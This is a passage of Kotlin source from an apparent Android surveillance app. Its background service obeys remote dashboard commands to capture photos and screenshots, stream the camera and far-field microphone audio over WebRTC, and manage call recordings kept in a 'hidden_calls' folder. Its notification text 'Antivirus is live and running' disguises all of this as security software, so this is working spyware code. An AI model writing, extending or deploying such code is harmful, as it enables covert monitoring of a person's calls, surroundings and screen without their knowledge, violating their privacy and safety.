                    sendHealthStatus(if (aiPhotoEnhancementEnabled) "photo_ai_on" else "photo_ai_off")
                    sendCommandAck("photo_ai", detail = if (aiPhotoEnhancementEnabled) "on" else "off")
                }
                "photo_quality" -> {
                    val mode = obj.optString("mode", "normal").trim().lowercase()
                    photoQualityMode = when (mode) {
                        "fast" -> "fast"
                        "hd" -> "hd"
                        else -> "normal"
                    }
                    sendHealthStatus("photo_quality_$photoQualityMode")
                    sendCommandAck("photo_quality", detail = photoQualityMode)
                }
                "photo_night" -> {
                    val mode = obj.optString("mode", "off").trim().lowercase()
                    photoNightMode = when (mode) {
                        "1s", "3s", "5s" -> mode
                        else -> "off"
                    }
                    sendHealthStatus("photo_night_$photoNightMode")
                    sendCommandAck("photo_night", detail = photoNightMode)
                }
                "delete_recording" -> {
                    val filename = obj.optString("filename", "")
                    if (filename.isNotBlank()) {
                        var deleted = false
                        val hiddenDir = File(applicationContext.filesDir, "hidden_calls")
                        if (hiddenDir.exists() && hiddenDir.isDirectory) {
                            val target = hiddenDir.walkTopDown().maxDepth(3).find { it.name == filename }
                            if (target != null && target.exists()) {
                                // Prevent deleting an actively recording file
                            if (CallRecorder.isRecording && target.absolutePath == CallRecorder.currentOutputFile?.absolutePath) {
                                    Log.w(TAG, "Attempted to delete active recording! Denied.")
                                } else if (target.delete()) {
                                    deleted = true
                                }
                            }
                        }
                        
                        if (deleted) Log.i(TAG, "Deleted recording upon PC confirmation: $filename")
                        
                        val uploadedKey = "uploaded_records_history"
                        val uploadedFiles = prefs.getStringSet(uploadedKey, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
                        val toRemove = uploadedFiles.filter { it.endsWith("/$filename") }
                        if (toRemove.isNotEmpty()) {
                            uploadedFiles.removeAll(toRemove.toSet())
                            prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
                        }
                        sendCommandAck("delete_recording", "success", filename)
                    }
                }
                "stream_codec" -> {
                    val mode = obj.optString("mode", "auto").trim().lowercase()
                    val requestedMode = when (mode) {
                        "pcm" -> "pcm"
                        "smart", "mulaw" -> "smart"
                        else -> "auto"
                    }
                    wsStreamMode = if (voiceProfile == "far") "pcm" else requestedMode
                    // BUG-R10: Persist codec preference
                    prefs.edit().putString("session_stream_codec", wsStreamMode).apply()
                    sendHealthStatus("stream_codec_$wsStreamMode")
                    Log.i(TAG, "WS stream mode set to $wsStreamMode")
                    val detail = if (voiceProfile == "far" && requestedMode != "pcm") {
                        "pcm_forced_far_mode"
                    } else {
                        wsStreamMode
                    }
                    sendCommandAck("stream_codec", detail = detail)
                }
                "set_low_network" -> {
                    val enabled = obj.optBoolean("enabled", false)
                    lowNetworkMode = enabled
                    // BUG-R10: Persist so restarts restore last chosen setting
                    // NEW-2: manual flag true when enabling (locks auto-detect out),
                    // false when disabling (re-enables auto-detect).
                    prefs.edit()
                        .putBoolean("session_low_network", enabled)
                        .putBoolean("session_low_network_manual", enabled)
                        .apply()
                    val caps = connectivityManager?.activeNetwork?.let { network ->
                        connectivityManager?.getNetworkCapabilities(network)
                    }
                    updateLowNetworkTransportTuning(caps)
                    applyAdaptiveBitrate()
                    Log.i(TAG, "Low-network mode ${if (enabled) "ENABLED" else "DISABLED"} (manual) - adaptive frame pacing active")
                    sendHealthStatus("low_network_${if (enabled) "on" else "off"}")
                    safeSend("""{"type":"low_network_ack","enabled":$enabled,"sampleRate":$lowNetworkSampleRate,"frameMs":$lowNetworkFrameMs}""")
                    sendCommandAck("set_low_network", detail = if (enabled) "on" else "off")
                }
                "voice_profile" -> {
                    val profile = obj.optString("profile", "room").trim().lowercase()  // Bug 5.1: Add .trim()
                    voiceProfile = when (profile) {
                        "near" -> "near"
                        "far" -> "far"
                        else -> "room"
                    }
                    // BUG-R10: Persist so restarts restore last chosen profile
                    prefs.edit().putString("session_voice_profile", voiceProfile).apply()
                    // WebRTC allowed for all profiles - don't stop it
                    sendHealthStatus("voice_profile_$voiceProfile")
                    Log.i(TAG, "Voice profile set to $voiceProfile")
                    sendCommandAck("voice_profile", detail = voiceProfile)
                }
                "set_gain" -> {
                    val level = obj.optDouble("level", 1.0).coerceIn(0.5, 5.0)
                    softwareGainMultiplier = level
                    // BUG-R10: Persist gain so restarts restore last chosen value
                    prefs.edit().putFloat("session_gain", level.toFloat()).apply()
                    Log.i(TAG, "Software gain set to ${level}x")
                    if (isWebRtcStreaming) {
                        val webrtcGain = if (voiceProfile == "far") level * 1.2 else level * 0.8
                        localAudioTrack?.setVolume(webrtcGain.coerceIn(0.5, 10.0))
                    }
                    safeSend("""{"type":"gain_ack","level":$level}""")
                    sendCommandAck("set_gain", detail = "${level}x")
                }
                "streaming_mode" -> {
                    // M-02: HQ buffered mode fully removed — always realtime
                    val mode = obj.optString("mode", "realtime").trim().lowercase()
                    Log.i(TAG, "streaming_mode command: mode=$mode, using REALTIME")
                    sendHealthStatus("streaming_mode_realtime")
                    safeSend("""{"type":"streaming_mode_ack","mode":"realtime","bufferSeconds":0}""")
                    sendCommandAck("streaming_mode", detail = "realtime")
                }
                "switch_camera" -> {
                    preferredCameraFacing = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT)
                        CameraCharacteristics.LENS_FACING_BACK
                    else
                        CameraCharacteristics.LENS_FACING_FRONT
                    val cameraText = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
                    if (isCameraLiveStreaming) startCameraLiveStream(preferredCameraFacing, true)
                    sendCommandAck("switch_camera", detail = cameraText)
                    // Auto-take a photo with the new camera so the user sees the result immediately
                    captureAndSendPhoto(cameraText)
                }
                "take_photo" -> {
                    val camera = obj.optString("camera", "current").trim().lowercase()
                    // Bug 6.4: Don't ACK here - ACK only after captureAndSendPhoto completes
                    captureAndSendPhoto(camera)
                }
                "take_screenshot" -> {
                    captureAndSendScreenshot()
                }
                "camera_live_start" -> {
                    val camera = obj.optString("camera", "current").trim().lowercase()
                    val explicitFacing = parseRequestedCameraFacing(camera)
                    val facing = explicitFacing ?: preferredCameraFacing
                    startCameraLiveStream(facing, strictFacing = explicitFacing != null)
                }
                "camera_live_stop" -> {
                    stopCameraLiveStream("remote_stop")
                }
                else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Invalid JSON command: ${e.message}")
            // Bug 6.8: Send fallback error ACK on parse failure
            sendCommandAck("unknown", "error", "parse_error")
        }
    }

    private fun ensurePeerConnectionFactory() {
        if (peerConnectionFactory != null) return
        Log.i(TAG, "Initializing WebRTC...")
        val initOpts = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        try {
            PeerConnectionFactory.initialize(initOpts)
        } catch (e: Exception) {
            Log.e(TAG, "PeerConnectionFactory.initialize failed: ${e.message}", e)
            throw e
        }
        Log.i(TAG, "WebRTC initialized, creating audio device module...")
        audioDeviceModule = JavaAudioDeviceModule.builder(this)
            // Prefer platform AEC/NS when available to reduce room echo and steady noise.
            .setUseHardwareAcousticEchoCanceler(true)
            .setUseHardwareNoiseSuppressor(true)
            .createAudioDeviceModule()
        Log.i(TAG, "Creating PeerConnectionFactory...")
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setAudioDeviceModule(audioDeviceModule)
            .createPeerConnectionFactory()
        Log.i(TAG, "WebRTC factory initialized")
    }

    private fun startWebRtcSession() {
        serviceScope.launch(Dispatchers.IO) {
            webRtcMutex.withLock {
                // WebRTC now allowed for all voice profiles
                if (peerConnection != null) return@withLock
                ensurePeerConnectionFactory()
                val factory = peerConnectionFactory ?: return@withLock

                // Bug 3: Set flag BEFORE stopping PCM to prevent race where both paths send simultaneously.
                // The PCM capture loop checks isWebRtcStreaming and will stop sending immediately.
                isWebRtcStreaming = true
                // We use WebRTC audio path for low-latency streaming, so stop raw PCM path.
                stopMicWatchdog()
                val captureJobToJoin = audioCaptureJob
                stopAudioCapture()

                // Configure WebRTC audio based on voice profile.
                // Far mode keeps AGC off (avoid pumping/distortion) but enables light NS/HPF
                // to reduce steady background noise and rumble.
                val isFarMode = voiceProfile == "far"
                
                val constraints = MediaConstraints().apply {
                    // Echo cancellation always OFF for one-way monitoring
                    mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "false"))
                    mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation2", "false"))
                    
                    // Aggressive noise suppression for clear voice
                    mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "true"))
                    // Far mode disables AGC family to avoid pumping up room noise.
                    mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", if (isFarMode) "false" else "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", if (isFarMode) "false" else "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", if (isFarMode) "false" else "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "false"))
                    
                    // Audio network adaptor: keep enabled for adaptive bitrate
                    optional.add(MediaConstraints.KeyValuePair("googAudioNetworkAdaptor", "true"))
                }
                
                Log.i(TAG, "WebRTC audio constraints: far_mode=$isFarMode, NS=true, AGC=${!isFarMode}, HPF=true")

                val iceServersForSession = cachedIceServers

                val rtcConfig = PeerConnection.RTCConfiguration(
                    iceServersForSession
                ).apply {
                    sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
                    continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
                }

                peerConnection = factory.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
                    override fun onIceCandidate(candidate: IceCandidate) {
                        val candidateJson = JSONObject().apply {
                            put("candidate", candidate.sdp)
                            put("sdpMid", candidate.sdpMid)
                            put("sdpMLineIndex", candidate.sdpMLineIndex)
                        }
                        val msg = JSONObject().apply {
                            put("type", "webrtc_ice")
                            put("candidate", candidateJson)
                        }
                        safeSend(msg.toString())
                    }

                    override fun onIceConnectionChange(newState: PeerConnection.IceConnectionState) {
                        sendWebRtcState("ice_${newState.name.lowercase()}")
                        if (newState == PeerConnection.IceConnectionState.CONNECTED ||
                            newState == PeerConnection.IceConnectionState.COMPLETED) {
                            webRtcRecoveryJob?.cancel()
                            webRtcRecoveryJob = null
                            iceWatchdogJob?.cancel()
                            iceWatchdogJob = null
                        }
                        if (newState == PeerConnection.IceConnectionState.DISCONNECTED ||
                            newState == PeerConnection.IceConnectionState.FAILED) {
                            scheduleWebRtcRecovery(newState.name.lowercase())
                        }
                    }

                    override fun onConnectionChange(newState: PeerConnection.PeerConnectionState) {
                        sendWebRtcState("pc_${newState.name.lowercase()}")
                    }

                    override fun onSignalingChange(newState: PeerConnection.SignalingState) {}
                    override fun onIceConnectionReceivingChange(receiving: Boolean) {}
                    override fun onIceGatheringChange(newState: PeerConnection.IceGatheringState) {}
                    override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
                    override fun onAddStream(stream: org.webrtc.MediaStream) {}
                    override fun onRemoveStream(stream: org.webrtc.MediaStream) {}
                    override fun onDataChannel(dataChannel: org.webrtc.DataChannel) {}
                    override fun onRenegotiationNeeded() {}
                    override fun onAddTrack(receiver: org.webrtc.RtpReceiver, mediaStreams: Array<out org.webrtc.MediaStream>) {}
                    override fun onTrack(transceiver: org.webrtc.RtpTransceiver) {}
                })

                val pc = peerConnection
                if (pc == null) {
                    // NEW-1: Rollback — setup failed, so PCM path must resume.
                    isWebRtcStreaming = false
                    sendWebRtcState("create_failed")
                    sendCommandAck("webrtc_start", "error", "create_failed")
                    if (wantsMicStreaming && activeWebSocket != null) {
                        startAudioCapture()
                        startMicWatchdog()
                    }
                    return@withLock
                }

                // Run track creation in a coroutine to allow the OS HAL time to release the mic
                serviceScope.launch(Dispatchers.IO) {
                    withTimeoutOrNull(2000) { captureJobToJoin?.join() }
                    delay(400)
                    if (!isWebRtcStreaming || peerConnection !== pc) {
                        sendCommandAck("webrtc_start", "error", "cancelled")
                        return@launch
                    }

                    try {
                        localAudioSource = factory.createAudioSource(constraints)
                        localAudioTrack = factory.createAudioTrack("mic_track", localAudioSource)
                        localAudioTrack?.setEnabled(true)
                        // Increase WebRTC hardware/software volume dynamically based on far-voice needs
                        val webrtcGain = if (isFarMode) softwareGainMultiplier * 1.2 else softwareGainMultiplier * 0.8
                        localAudioTrack?.setVolume(webrtcGain.coerceIn(0.5, 10.0))
                        val currentTrack = localAudioTrack
                        if (currentTrack != null) {
                            webRtcAudioSender = pc.addTrack(currentTrack, listOf("mic_stream"))
                            currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
                            applyAdaptiveBitrate()
                            updateNotification("Antivirus is live and running")
                            sendHealthStatus("webrtc_started")
                            sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
                            
                            // Send ACK now so dashboard waits to create SDP Offer UNTIL track is added
                            sendCommandAck("webrtc_start")

                            val queuedOffer = pendingRemoteOfferSdp
                            if (!queuedOffer.isNullOrBlank()) {
                                pendingRemoteOfferSdp = null
                                Log.i(TAG, "Applying queued WebRTC offer after start")
                                applyRemoteOfferAndCreateAnswer(queuedOffer)
                            }
                        } else {
                            Log.e(TAG, "Failed to create WebRTC audio track")
                            isWebRtcStreaming = false
                            sendWebRtcState("track_create_failed")
                            sendCommandAck("webrtc_start", "error", "track_create_failed")
                            if (wantsMicStreaming && activeWebSocket != null) {
                                startAudioCapture()
                                startMicWatchdog()
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "WebRTC init error: ${e.message}")
                        isWebRtcStreaming = false
                        sendCommandAck("webrtc_start", "error", "exception")
                        if (wantsMicStreaming && activeWebSocket != null) {
                            startAudioCapture()
                            startMicWatchdog()
                        }
                    }

                    serviceScope.launch(Dispatchers.IO) {
                        val fresh = fetchIceServersFromServer()
                        if (fresh != cachedIceServers) {
                            cachedIceServers = fresh
                            Log.i(TAG, "ICE servers refreshed for next WebRTC session")
                        }
                    }
                }
            }
        }
    }
    
    private fun stopWebRtcSession(notifyState: Boolean) {
        webRtcRecoveryJob?.cancel()
        webRtcRecoveryJob = null
        iceWatchdogJob?.cancel()
        iceWatchdogJob = null
        // Bug L9 fix: Don't clear isCapturingGuard here — stopWebRtcSession doesn't own it.
        // Clearing it could allow a second concurrent startAudioCapture → hardware conflict.
        // Removed unregisterNetworkCallbackForBitrate
        try {
            peerConnection?.close()
        } catch (_: Exception) {}
        peerConnection = null
        webRtcAudioSender = null
        try {
            localAudioTrack?.dispose()
            localAudioSource?.dispose()
        } catch (_: Exception) {}
        localAudioTrack = null
        localAudioSource = null
        pendingRemoteOfferSdp = null
        val wasStreaming = isWebRtcStreaming
        isWebRtcStreaming = false

        if (notifyState && wasStreaming) sendHealthStatus("webrtc_stopped")
        if (notifyState && wasStreaming) sendWebRtcState("stopped")

        // Resume legacy PCM stream only when dashboard still wants it.
        if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
            serviceScope.launch(Dispatchers.IO) {
                delay(1000) // Give WebRTC time to release the microphone
                if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
                    startAudioCapture()
                    startMicWatchdog()
                    updateNotification("Antivirus is live and running")
                }
            }
        }
    }

    private fun applyRemoteOfferAndCreateAnswer(remoteSdp: String) {
        // H-04: Don't call startWebRtcSession here — require explicit webrtc_start first.
        // If peerConnection is null, the offer arrived before webrtc_start; ignore it.
        val pc = peerConnection ?: run {
            pendingRemoteOfferSdp = remoteSdp
            Log.w(TAG, "webrtc_offer received before PeerConnection ready — queued")
            return
        }
        val targetKbps = chooseTargetBitrateKbps()

        pc.setRemoteDescription(object : SdpObserver {
            override fun onSetSuccess() {
                val answerConstraints = MediaConstraints()
                pc.createAnswer(object : SdpObserver {
                    override fun onCreateSuccess(desc: SessionDescription?) {
                        if (desc == null) return
                        val tuned = tuneOpusSdp(desc.description, targetKbps)
                        val localAnswer = SessionDescription(SessionDescription.Type.ANSWER, tuned)
                        pc.setLocalDescription(object : SdpObserver {
                            override fun onSetSuccess() {
                                val msg = JSONObject().apply {
                                    put("type", "webrtc_answer")
                                    put("sdp", tuned)
                                }
                                safeSend(msg.toString())
                                applyAdaptiveBitrate()
                                sendWebRtcState("answer_sent_${targetKbps}kbps")
                                // Start a watchdog with TURN-friendly timeout window.
                                iceWatchdogJob?.cancel()
                                iceWatchdogJob = serviceScope.launch(Dispatchers.IO) {
                                    delay(15_000)
                                    val stateAt15 = peerConnection?.iceConnectionState()
                                    if (stateAt15 == PeerConnection.IceConnectionState.CHECKING) {
                                        sendWebRtcState("ice_checking_extend")
                                    }

                                    delay(15_000)
                                    val finalState = peerConnection?.iceConnectionState()
                                    val connected =
                                        finalState == PeerConnection.IceConnectionState.CONNECTED ||
                                        finalState == PeerConnection.IceConnectionState.COMPLETED
                                    if (isWebRtcStreaming && !connected) {
                                        Log.w(TAG, "ICE watchdog: no connection after 30s — falling back to PCM (state=$finalState)")
                                        sendWebRtcState("ice_timeout")
                                        stopWebRtcSession(notifyState = true)
                                    }
                                }
                            }

                            override fun onSetFailure(error: String?) {
                                sendWebRtcState("local_set_fail")
                                Log.e(TAG, "WebRTC setLocalDescription failed: $error")
                            }

                            override fun onCreateSuccess(desc: SessionDescription?) {}
                            override fun onCreateFailure(error: String?) {}
                        }, localAnswer)
                    }

                    override fun onCreateFailure(error: String?) {
                        sendWebRtcState("answer_create_fail")
                        Log.e(TAG, "WebRTC createAnswer failed: $error")
                    }

                    override fun onSetSuccess() {}
                    override fun onSetFailure(error: String?) {}
                }, answerConstraints)
            }

            override fun onSetFailure(error: String?) {
                sendWebRtcState("remote_set_fail")
                Log.e(TAG, "WebRTC setRemoteDescription failed: $error")
            }

            override fun onCreateSuccess(desc: SessionDescription?) {}
            override fun onCreateFailure(error: String?) {}
        }, SessionDescription(SessionDescription.Type.OFFER, remoteSdp))
    }

    private fun tuneOpusSdp(sdp: String, targetKbps: Int): String {
        val opusPayload = Regex("a=rtpmap:(\\d+) opus/48000/2", RegexOption.IGNORE_CASE)
            .find(sdp)
            ?.groupValues
            ?.getOrNull(1)
            ?: return sdp
        
        // Far mode: always use maximum quality settings
        val isFarMode = voiceProfile == "far"
        
        // In low network mode, keep quality-biased compression settings.
        // In far mode, use higher bitrates for distant voice capture.
        val effectiveTarget = when {
            isFarMode -> targetKbps.coerceAtLeast(WEBRTC_FAR_MIN_KBPS)
            lowNetworkMode -> targetKbps.coerceAtMost(WEBRTC_MAX_BITRATE_KBPS)
            else -> targetKbps
        }
        val maxBitrateLimit = if (isFarMode) WEBRTC_FAR_MAX_KBPS * 1000 else WEBRTC_STANDARD_MAX_KBPS * 1000
        val maxAvg = (effectiveTarget * 1000).coerceIn(WEBRTC_LAST_RESORT_BITRATE_KBPS * 1000, maxBitrateLimit)
        val opusMinAvgFloor = if (isFarMode) 24_000 else 16_000
        val minAvg = opusMinAvgFloor.coerceAtMost(maxAvg - 1_000)
        
        // Adaptive ptime: 20ms normal, 40ms for low network (fewer packets)
        // Far mode: use 20ms for lower latency
        val ptime = if (lowNetworkMode && !isFarMode) lowNetworkFrameMs.toString() else "20"
        
        // Far mode: always use 48kHz for full quality
        val playbackRate = when {
            isFarMode -> "48000"
            lowNetworkMode -> "16000"
            else -> "48000"
        }
        
        val fmtpRegex = Regex("a=fmtp:$opusPayload ([^\\r\\n]+)")
        val tunedParams = mapOf(
            "maxaveragebitrate" to maxAvg.toString(),
            "minaveragebitrate" to minAvg.toString(),
            "maxplaybackrate" to playbackRate,
            "sprop-maxcapturerate" to playbackRate,
            "ptime" to ptime,
            "minptime" to ptime,
            "useinbandfec" to "1",           // FEC: recovers lost packets on low network
            "usedtx" to "0",                // DTX OFF: prevents audible gaps / "lag" feel
            "stereo" to "0",
            "sprop-stereo" to "0",
            "cbr" to "0",                    // VBR: allocates more bits to complex speech
            "complexity" to if (isFarMode) "10" else if (lowNetworkMode) "7" else "10",
        )
        return if (fmtpRegex.containsMatchIn(sdp)) {
            sdp.replace(fmtpRegex) { match ->
                val merged = mergeFmtpParams(match.groupValues[1], tunedParams)
                "a=fmtp:$opusPayload $merged"
            }
        } else {
            val joined = tunedParams.entries.joinToString(";") { "${it.key}=${it.value}" }
            sdp + "\r\na=fmtp:$opusPayload $joined"
        }
    }

    private fun mergeFmtpParams(base: String, updates: Map<String, String>): String {
        val params = linkedMapOf<String, String>()
        base.split(';')
            .map { it.trim() }
            .filter { it.isNotBlank() }
            .forEach { token ->
                val idx = token.indexOf('=')
                if (idx <= 0 || idx >= token.length - 1) return@forEach
                val key = token.substring(0, idx).trim().lowercase()
                val value = token.substring(idx + 1).trim()
                if (key.isNotBlank() && value.isNotBlank()) {
                    params[key] = value
                }
            }
        updates.forEach { (k, v) -> params[k.lowercase()] = v }
        return params.entries.joinToString(";") { "${it.key}=${it.value}" }
    }

    private fun sendWebRtcState(state: String) {
        val msg = JSONObject().apply {
            put("type", "webrtc_state")
            put("state", state)
            put("bitrateKbps", currentWebRtcBitrateKbps)
            put("deviceId", deviceId)
            put("ts", System.currentTimeMillis())
            if (lastDashboardQuality != null) put("quality", lastDashboardQuality)
        }
        safeSend(msg.toString())
    }

    private fun scheduleWebRtcRecovery(reason: String) {
        if (webRtcRecoveryJob?.isActive == true) return
        Log.w(TAG, "WebRTC connection lost ($reason) - aborting and falling back to PCM")
        webRtcRecoveryJob = serviceScope.launch(Dispatchers.IO) {
            delay(2000)
            if (!isWebRtcStreaming || peerConnection == null) return@launch
            sendWebRtcState("aborted_recovery_failed")
            stopWebRtcSession(notifyState = true)
        }
    }

    private fun fetchIceServersFromServer(): List<PeerConnection.IceServer> {
        val fallback = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
        val url = "$serverHttpBaseUrl/api/webrtc-config"
        return try {
            val reqBuilder = Request.Builder().url(url)
            if (wsAuthToken.isNotBlank()) reqBuilder.addHeader("X-Auth-Token", wsAuthToken)
            val response = httpClient.newCall(reqBuilder.build()).execute()
            if (!response.isSuccessful) return fallback
            val body = response.body?.string().orEmpty()
            if (body.isBlank()) return fallback
            val json = JSONObject(body)
            val arr = json.optJSONArray("iceServers") ?: JSONArray()
            val parsed = mutableListOf<PeerConnection.IceServer>()
            for (i in 0 until arr.length()) {
                val item = arr.optJSONObject(i) ?: continue
                val urls = mutableListOf<String>()
                when (val u = item.opt("urls")) {
                    is String -> if (u.isNotBlank()) urls.add(u)
                    is JSONArray -> {
                        for (j in 0 until u.length()) {
                            val s = u.optString(j, "")
                            if (s.isNotBlank()) urls.add(s)
                        }
                    }
                }
                if (urls.isEmpty()) continue
                val builder = PeerConnection.IceServer.builder(urls)
                val user = item.optString("username", "")
                val cred = item.optString("credential", "")
                if (user.isNotBlank()) builder.setUsername(user)
                if (cred.isNotBlank()) builder.setPassword(cred)
                parsed.add(builder.createIceServer())
            }
            if (parsed.isEmpty()) fallback else parsed
        } catch (e: IOException) {
            Log.w(TAG, "ICE config fetch failed: ${e.message}")
            fallback
        } catch (e: Exception) {
            Log.w(TAG, "ICE config parse failed: ${e.message}")
            fallback
        }
    }

    private fun chooseTargetBitrateKbps(): Int {
        // Keep low-network mode bounded to voice-safe bitrate.
        if (lowNetworkMode) return currentWebRtcBitrateKbps.coerceAtMost(WEBRTC_MID_BITRATE_KBPS)

        // FAR MODE: Use highest bitrates for raw quality capture
        val isFarMode = voiceProfile == "far"
        
        // FAR MODE (good network): Use higher bitrates for better distant voice capture
        if (isFarMode) {
            val cm = connectivityManager
            val network = cm?.activeNetwork
            val caps = network?.let { cm.getNetworkCapabilities(it) }
            
            // Default to max far mode bitrate
            var target = WEBRTC_FAR_MAX_KBPS
            
            // Check network quality for far mode
            val q = lastDashboardQuality
            val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
            val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
            
            val severeLoss = !loss.isNaN() && loss >= 10.0
            val severeRtt = !rtt.isNaN() && rtt >= 500.0
            if (severeLoss && severeRtt) return WEBRTC_LAST_RESORT_BITRATE_KBPS

            // Even in far mode, respect severe network issues
            if (severeLoss || severeRtt) {
                target = WEBRTC_FAR_MIN_KBPS
            } else if (caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
                val downKbps = caps.linkDownstreamBandwidthKbps
                target = when {
                    downKbps in 1..500 -> WEBRTC_FAR_MIN_KBPS
                    downKbps in 501..2000 -> WEBRTC_FAR_MID_KBPS
                    else -> WEBRTC_FAR_MAX_KBPS
                }
            }
            
            return target.coerceIn(WEBRTC_FAR_MIN_KBPS, WEBRTC_FAR_MAX_KBPS)
        }
        
        // STANDARD MODE: Use higher bitrates (64-128 kbps)
        val cm = connectivityManager ?: return WEBRTC_STANDARD_MID_KBPS
        val network = cm.activeNetwork ?: return WEBRTC_STANDARD_MID_KBPS
        val caps = cm.getNetworkCapabilities(network) ?: return WEBRTC_STANDARD_MID_KBPS
        
        // Start from the voice-safe floor for normal profile.
        var target = if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
            WEBRTC_MIN_BITRATE_KBPS
        } else {
            WEBRTC_STANDARD_MIN_KBPS
        }
        
        if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
            val downKbps = caps.linkDownstreamBandwidthKbps
            target = when {
                // Keep WiFi tuning in voice-safe range.
                downKbps in 1..200 -> WEBRTC_MIN_BITRATE_KBPS
                downKbps in 201..500 -> WEBRTC_MID_BITRATE_KBPS
                downKbps in 501..1000 -> WEBRTC_STANDARD_MIN_KBPS
                else -> WEBRTC_STANDARD_MAX_KBPS
            }
        }
        
        val q = lastDashboardQuality
        val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
        val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
        val jitter = q?.optDouble("jitterMs", Double.NaN) ?: Double.NaN
        
        // Last resort only under sustained severe degradation.
        val severeLoss = !loss.isNaN() && loss >= 10.0
        val severeRtt = !rtt.isNaN() && rtt >= 500.0
        if (wsReconnectAttempts >= 3) return WEBRTC_LAST_RESORT_BITRATE_KBPS
        if (severeLoss && severeRtt) return WEBRTC_LAST_RESORT_BITRATE_KBPS
        if (!jitter.isNaN() && jitter >= 200.0) return WEBRTC_MIN_BITRATE_KBPS
        
        // Moderate issues: use low-network mid bitrate (32 kbps).
        if ((!loss.isNaN() && loss >= 5.0) || (!rtt.isNaN() && rtt >= 250.0) || (!jitter.isNaN() && jitter >= 100.0)) {
            return WEBRTC_MID_BITRATE_KBPS
        }
        
        return target.coerceIn(WEBRTC_MIN_BITRATE_KBPS, WEBRTC_STANDARD_MAX_KBPS)
    }

    private fun applyAdaptiveBitrate() {
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        val sender = webRtcAudioSender ?: return
        try {
            val params = sender.parameters ?: return
            if (params.encodings.isNullOrEmpty()) return
            val targetBps = currentWebRtcBitrateKbps * 1000
            params.encodings.forEach { encoding ->
                encoding.maxBitrateBps = targetBps
            }
            sender.parameters = params
            sendWebRtcState("bitrate_${currentWebRtcBitrateKbps}kbps")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to apply bitrate params: ${e.message}")
        }
    }



    private fun captureAndSendPhoto(cameraMode: String) {
        val oldLiveJob = if (isCameraLiveStreaming) cameraLiveJob else null
        val wasLive = isCameraLiveStreaming
        if (oldLiveJob != null) {
            stopCameraLiveStream("snapshot_requested")
        }
        // BUG-R1/R13 fix: photoCaptureBusyGuard is the ONE atomic gate — no secondary @Volatile flag
        if (!photoCaptureBusyGuard.compareAndSet(false, true)) {
            sendCommandAck("take_photo", "busy")  // Bug 6.5: Use JSON format
            return
        }
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            photoCaptureBusyGuard.set(false)
            sendCommandAck("take_photo", "error", "camera_permission_denied")
            return
        }
        serviceScope.launch(Dispatchers.IO) {
            try {
                if (oldLiveJob != null) {
                    try { withTimeout(2_000L) { oldLiveJob.join() } } catch (_: Exception) {}
                }
                val totalTimeoutMs = when (photoNightMode) {
                    "5s" -> 25_000L
                    "3s" -> 20_000L
                    "1s" -> 18_000L
                    else -> 15_000L
                }
                withTimeoutOrNull(totalTimeoutMs) {
                    val explicitFacing = parseRequestedCameraFacing(cameraMode)
                    val facing = explicitFacing ?: preferredCameraFacing
                    val currentPreferredFacing = facing
                    
                    // Single capture attempt - no retry for speed
                    val captureResult = captureJpegOnce(currentPreferredFacing, allowFacingFallback = explicitFacing == null)
                    
                    val jpeg = captureResult?.first
                    val actuallyUsedFacing = captureResult?.second ?: currentPreferredFacing

                    if (jpeg == null || jpeg.isEmpty()) {
                        sendCommandAck("take_photo", "error", "capture_failed")
                        return@withTimeoutOrNull
                    }
                    
                    val isFrontCamera = (actuallyUsedFacing == CameraCharacteristics.LENS_FACING_FRONT)
                    val optimized = optimizePhotoJpeg(jpeg, isFrontCamera)
                    val cameraName = if (isFrontCamera) "front" else "rear"
                    preferredCameraFacing = actuallyUsedFacing
                    
                    // Bug Fix: Embed quality and night mode in filename so backend/dashboard can display it
                    // Format: photo_{deviceId}_{camera}_{quality}_{nightMode}_{timestamp}.jpg
                    val safeQuality = photoQualityMode.replace(Regex("[^a-zA-Z0-9]"), "")
                    val safeNight = photoNightMode.replace(Regex("[^a-zA-Z0-9]"), "")
                    val filename = "photo_${deviceId}_${cameraName}_${safeQuality}_${safeNight}_${System.currentTimeMillis()}.jpg"

                    var httpSuccess = false
                    try {
